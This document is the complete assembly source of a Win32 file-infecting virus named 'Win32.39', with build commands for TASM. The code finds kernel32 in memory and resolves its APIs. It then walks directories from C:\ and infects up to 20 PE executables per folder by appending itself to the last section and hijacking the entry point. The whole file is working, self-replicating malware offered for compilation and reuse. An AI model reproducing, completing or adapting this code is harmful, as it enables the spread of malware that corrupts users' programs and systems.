              
;
;
; Win32.39 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.39
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 39
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : Upwards, Downwards,
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 37
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
                                        ; mov ebp, ecx
 mov ebp, ecx
 sub eax, edx                           ; Trash
 sub ebp, offset Delta
 jmp KernelSearchStart


;       [ ///// * Travel Directories Upwards * \\\\\ ]
                                        ; Procedure to walk trough
                                        ; directories upwards
TravelUpwards:
 lea eax, [ebp+RootDir]
 xchg edx, eax

 push edx
 or ebx, 24908731d                      ; Trash
                                        ; start at c:\
 call dword ptr [ebp+XSetCurrentDirectoryA]
StartTravelDirsUp:
 lea edx, [ebp+Folders]
 xchg edx, eax

 call FindFirstFileProc
 cmp dword ptr [ebp+FindHandle], -1
 je EndTravelUp
GetOtherDir:
                                        ; is it a directory ?
 mov ecx, dword ptr [ebp+WFD_dwFileAttributes]
 and ecx, 10h
 jz GetNextDirUp
                                        ; is it the . or .. directory ?
 lea edi, [ebp+WFD_szFileName]
 xchg edi, esi


 cmp byte ptr [esi], '.'
 je GetNextDirUp
 call GetRand
                                        ; mov ebx, 10
 push 10d
 pop ebx
 mov eax, dword ptr [ebp+RandVal]
                                        ; clear edx
 mov edx, 51726d
 sub edx, 51726d
 div ebx
 cmp edx, 0 ; can we infect this ?
 jne GetNextDirUp
 push dword ptr [ebp+FindHandle]
 pop edx

 push edx
 call dword ptr [ebp+XFindClose]
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XSetCurrentDirectoryA]
 call InfectCurDir
 jmp StartTravelDirsUp
GetNextDirUp:
 call FindNextFileProc
 test eax, eax
 jnz GetOtherDir
EndTravelUp:
                                        ; close the search handel
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindClose]
ret



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; get Current Directory
 lea edi, [ebp+OldDirectory]
 xchg ecx, edi

 push ecx
                                        ; mov eax, 255
 mov eax, 0
 add eax, 255d
 push eax
 call dword ptr [ebp+XGetCurrentDirectoryA]

                                        ; Travel Directories down
                                        ; mov ebx, 1
 mov ebx, 0
 add ebx, 1d
 lea edi, [ebp+DotDot]
 xchg edi, ecx

TravelDownLoop:
 push ecx
 call dword ptr [ebp+XSetCurrentDirectoryA]
 pushad
 call InfectCurDir
 popad
 add ebx, -1
 or ebx, ebx
 jnz TravelDownLoop


 call TravelUpwards

                                        ; restore old directory
 lea esi, [ebp+OldDirectory]
 xchg esi, ecx

 push ecx
 call dword ptr [ebp+XSetCurrentDirectoryA]

 call InfectCurDir
 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [edi+3Ch]
 add esi, edi
                                        ; get File Alignment
                                        ; add esi, 60
 dec esi
 add esi, 61d
 mov eax, [esi]
 add esi, -60d
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], eax
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infect by increasing the last section
 mov esi, ecx
                                        ; get last section
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
                                        ; add ecx, 120
 dec ecx
 add ecx, 121d
 add ecx, eax
                                        ; clear ebx
 mov ebx, 65695d
 sub ebx, 65695d
 add ebx, dword ptr [esi+74h]
 sal ebx, 3
 add ecx, ebx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 not ebx                                ; Trash
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ebx
 mov ebx, [ecx+10h]
                                        ; mov eax, ebx
 push ebx
 pop eax
 add ebx, [ecx+14h]
 push ebx
 mov edx, eax
 add edx, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
 mov edx, [ecx+10h]
 push edx
                                        ; calculate new section size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; clear edx
 sub edx, edx
 xor edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], edx
 pop edx
 add edx, VirusSize
 mov dword ptr [ecx+08h], edx
 mov edx, dword ptr [ecx+10h]
 add edx, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '39'
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 mov ecx, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov ecx, dword ptr [ebp+InfCounter]
 add ecx, -1
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 stc
ret



;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]
 xchg eax, ecx

                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea eax, [ebp+WFD_nFileSizeLow]

 cmp dword ptr [eax], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 je Notagoodfile
 push dword ptr [esi+3Ch]
 pop edi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, esi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
                                        ; clear ecx
 sub ecx, ecx
 cmp ecx, 0
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], '39'
 jz Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [edi+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 inc ebx                                ; Trash
                                        ; check for OBJ
 mov dx, word ptr [edi+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 DotDot db '..',0 


 APIOffsets:
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XGetCurrentDirectoryA  dd 0h
 XSetCurrentDirectoryA  dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h

 FindHandle  dd 0h
 RootDir db 'C:\',0
 AlignReg2   dd 0h
 db 'Win32.39 created by SnakeByte',0
 AlignReg1   dd 0h
 Folders db '*.',0
 OldBase     dd 400000h
 NewEIP      dd 0h
 OldEIP      dd 0h
 FileHandle  dd 0h
 counter     dw 0h

 APINames:
 db 'CreateFileA', 0
 db 'FindClose', 0
 db 'CreateFileMappingA', 0
 db 'FindFirstFileA', 0
 db 'GetCurrentDirectoryA', 0
 db 'SetCurrentDirectoryA', 0
 db 'FindNextFileA', 0
 db 'CloseHandle', 0
 db 'UnmapViewOfFile', 0
 db 'MapViewOfFile', 0

 MapHandle   dd 0h
 filemask    db '*.Exe',0
 KernelPE    dd 0h
 InfCounter  dd 0h
 RandVal     dd 0h
 OTableVA    dd 0h
 NewSize     dd 0h
 MapAddress  dd 0h
 OldDirectory db 255d dup (0h)
 TempApisearch2 dd 0h
 TempApisearch3 dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 ATableVA    dd 0h
 KernelMZ    dd 0h
 K32Trys     dd 0h
 NTableVA    dd 0h
 TempAPI     dd 0h




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 10615d
 sub edx, 10615d
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov edi, -1
 mov edi, 0
 add edi, -1d
 and edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 dec ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea ecx, [ebp+WFD_szFileName]

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop ecx
 test eax, eax
 jz CloseFile
                                        ; clear ebx
 sub ebx, ebx
 push ecx
 push ebx
 push ebx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 xor dword ptr [ebp+MapAddress], eax
 clc
ret
 shl ebx, 27d                           ; Trash

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;         [ ///// * Create a random number * \\\\\ ]

GetRand:                                ; Create a random value
 pushad
 mov ebx, dword ptr [ebp+RandVal]
 add ebx, dword ptr [ebp+WFD_nFileSizeLow]
 mov dword ptr [ebp+RandVal], ebx
 popad
 ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea eax, [ebp+WFD_szFileName]

                                        ; mov ecx, 276
 mov ecx, ( 276d xor 3d )
 xor ecx, 3d

ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 add eax, 1d
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, eax

 push eax
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA

 push esi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax

                                        ; mov esi, -1
 mov esi, -1d
 and esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ecx, dword ptr [esp]
                                        ; round to pages
 xor cx, cx
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 5h

GK1:                                    ; check for DOS-EXE Stub
 mov eax, dword ptr [ebp+K32Trys]
 cmp eax, 0h
 jz NoKernel
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je CheckPE

GK2:
 sub ecx, 65536d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edx, [ecx+3Ch]
 add edx, ecx
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], edx

 jmp GetApis

;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 mov eax, ebp
 add eax, offset APIOffsets

 mov edi, offset APINames
 add edi, ebp


GetApisLoop: 

 push edi
 pop ebx
APINameDetect:                          ; calculate the lenght of the names
 add ebx, 1d
 cmp byte ptr [ebx], 0
 jne APINameDetect
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 push ebx
 sub dword ptr [esp], edi
 pop ebx
                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; edi points to the Name
                                        ; eax points to the offset

 call SearchAPI1
 add edi, ebx
                                        ; add edi, 1
 sub edi, -1d
                                        ; mov edx, -1
 push -1d
 pop edx
 and edx, dword ptr [ebp+TempAPI]
 mov dword ptr [eax], -1
 and dword ptr [eax], edx
                                        ; add eax, 4
 add eax, 4d
 loop GetApisLoop
 lea edi, [ebp+Outbreak]

 push edi
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; edi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ecx, [eax+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 add ecx, 28d
                                        ; get ATableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
                                        ; get NTableVA
 mov eax, dword ptr [ecx]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push eax
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; mov eax, edx
                                        ; clear eax
 and eax, 0
 add eax, edx
                                        ; mov esi, eax
 mov esi, eax
 push ebx
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], 0
 dec ecx                                ; Trash
 xor dword ptr [ebp+TempApisearch3], edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov cl, byte ptr [edi]
 cmp cl, byte ptr [esi]
 jne ApiNotFound
 add ebx, -1
 sub ebx, 1
 add ebx, 1
 jz FoundApi1
                                        ; add edi, 1
 inc edi
                                        ; add esi, 1
 add esi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
 pop eax
 mov esi, dword ptr [ebp+TempApisearch2]
 mov edi, dword ptr [ebp+TempApisearch3]
                                        ; add eax, 4
 dec eax
 add eax, 5d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 mov edx, eax
                                        ; clear eax
 push 0
 pop eax
 mov ax, word ptr [edx]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [eax]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 xor ecx, eax                           ; Trash
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 shr ecx, 4d                            ; Trash
 push 0h
 call ExitProcess



end FakeCode

